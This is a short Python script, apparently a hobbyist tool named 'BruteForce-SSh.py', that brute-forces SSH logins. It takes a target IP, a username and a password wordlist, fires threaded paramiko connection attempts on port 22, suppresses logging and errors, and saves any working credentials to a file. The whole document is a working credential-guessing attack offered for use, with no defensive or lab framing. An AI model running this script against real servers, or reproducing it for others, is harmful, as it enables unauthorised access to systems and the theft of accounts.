
import csv
import threading
import time
from paramiko import SSHClient, AutoAddPolicy, ssh_exception, AuthenticationException
import sys
import logging
from logging import NullHandler


def sshbruteforce():
    try:
        ipssh = sys.argv[1]

        username = sys.argv[2]
        passwordfile = sys.argv[3]
    except:
        print("""
Programmed By => Taha

How To Use:
    python3 BruteForce-SSh.py [ip] [username] [passwordfile.txt]

example:
    python3 BruteForce-SSh.py 192.168.100.121 taha pass.txt
        """)
        exit()
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    print(
        f"""
[+] We Are Working ... 

Username: {username}
Password File: {passwordfile}
Ip: {ipssh}

            """)

    def connect(ipssh, username, password):

        try:
            ssh_client.connect(ipssh, port=22, username=username,
                               password=password, banner_timeout=300)
            print(f"Username = {username}\nPassword = {password}")
            print(f"[+] Saved To ssh_{ipssh}.txt")
            with open(f"ssh_{ipssh}.txt", "a") as fh:

                fh.write(f"""
Username: {username}
Password: {password}
Ip {ipssh}
                """)
        except AuthenticationException:
            pass
        except ssh_exception.SSHException:
            pass

    try:
        logging.getLogger('paramiko.transport').addHandler(NullHandler())
        with open(passwordfile) as pf:

            csv_reader = csv.reader(pf)
            for index, row in enumerate(csv_reader):
                if index == 0:
                    continue
                else:
                    thre = threading.Thread(
                        target=connect, args=(ipssh, username, row[0],))
                    thre.start()
                    time.sleep(0.2)
    except:
        pass


sshbruteforce()
